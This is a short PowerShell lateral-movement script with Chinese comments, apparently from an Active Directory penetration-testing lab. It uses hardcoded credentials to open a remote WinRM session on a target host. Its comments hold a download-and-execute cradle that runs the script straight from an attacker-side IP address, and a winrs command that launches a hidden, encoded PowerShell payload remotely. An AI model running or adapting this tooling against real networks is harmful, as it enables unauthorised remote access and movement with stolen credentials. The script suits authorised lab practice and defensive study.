# powershell模拟WinRM执行命令 winrs -r:192.168.239.72 -u:jen -p:Nexus123! "cmd /C powershell -nop -w hidden -Enc JAB...ABC"
#
# 调用方式:
# iex (New-Object Net.WebClient).downloadstring('http://192.168.45.178/t_ad-lateral-movement-with-winrm.ps1')
# Enter-PSSession 1
#
# {{{ TODO: change this
$username = 'jen';
$password = 'Nexus123!';
$target = '192.168.239.72'
# }}}

# 创建credential 对象
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# 创建session, 结果中显示session id
New-PSSession -ComputerName $target -Credential $credential

# 进入创建的session; session id
#Enter-PSSession 1
Write-Output "`n enter PSSession use cmd like:`n`nEnter-PSSession 1"
